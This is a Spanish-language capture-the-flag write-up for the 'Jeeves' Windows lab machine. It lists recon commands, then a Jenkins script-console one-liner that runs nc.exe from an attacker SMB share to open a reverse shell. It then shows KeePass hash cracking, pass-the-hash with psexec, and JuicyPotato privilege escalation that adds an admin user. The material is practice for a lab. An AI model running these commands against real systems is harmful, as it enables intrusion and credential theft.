---
title: "Jeeves"
description: "Jeeves"
pubDate: 2025-05-20
---

https://www.youtube.com/watch?v=TwJiEWjI6Go

# Fase de reconocimiento

\#win

## Puertos:

80
445
50000 Jetty

## SMB

````
crackmapexec smb <ip>
````

````
smbclient -L <ip> -N
````

````
smbmap -H <ip>
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240513202009.png)

## Fuzzing

````
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
````

# Fase de ataque

En al ruta del Jenkins está expuesto el "Administrar Jenkins" desde donde se puede enviar una reverse shell.
Como es Windows:

1. Compartirnos el nc.exe por un recurso compartido

````
impacket-smbserver smbFolder $(pwd) -smb2support
````

2. Ejecutamos a través del recurso compartido un reverse shell en Jenkins

````
println "\\\\<ipa>\\smbFolder\\nc.exe -e cmd <ipa> 443".execute().text
````

3. Nos ponemos en escucha

````
rlwrap nc -nlvp 443
````

\[-\] ==pwned!==

# Privilege Escalation

## 1 Forma

### KeePass Crack

1. Encontramos el archivo .kdbx en el equipo
1. Copiamos en el recurso compartido

````
copy <archivo> \\<ipa>\smbFolder\<archivo>
````

3. Instalamos KeePass

````
apt install keepassxc
````

4. Convertimos el archivo

````
keepass2john <archivo.kdbx>
````

5. Crackeamos para conseguir la contraseña

````
john --wordlist=/usr/share/wordlist/rockyou.txt <arhivohash>
````

Encontramos en KeePass un hash= hash:==hash==

### Pass The Hash

Probamos el hash encontrado con crackmapexec

````
crackmapexec smb <ip> -u 'Administrador' -H '<hash>'
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240513204249.png)
Nos conectamos con el Hash

````
psexec.py WORKGROUP/Administrator@<ip> -hashes :<hash>
````

\[+\] ==pwned!==
Ver archivos ocultos windows

````
dir /r /s
````

## 2 Forma

Ver privilegios

````
whoami /priv
````

Como tenemos privilegios SeImpersonatePrivilege
Copiamos el JuicyPotato por recurso compartido

````
copy \\<ipa>\smbFolder\Juicy.exe JP.exe
````

Creamos un usuario con privilegios

````
JP.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net user test pass1234 /add" -l 1337
````

Cambiamos el registro
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240513205400.png)
Probamos que sea Admin

````
crackmapexec smb <ip> -u 'test' -p 'pass1234'
````

Nos conectamos

````
psexec.py WORKGROUP/test@<ip> cmd.exe
````

\[+\] ==pwned!==
Crear recurso compartido en su caso

````
JP.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net share folder=C:\Windows\Temp /GRANT:Administrators,FULL" -l 1337
````
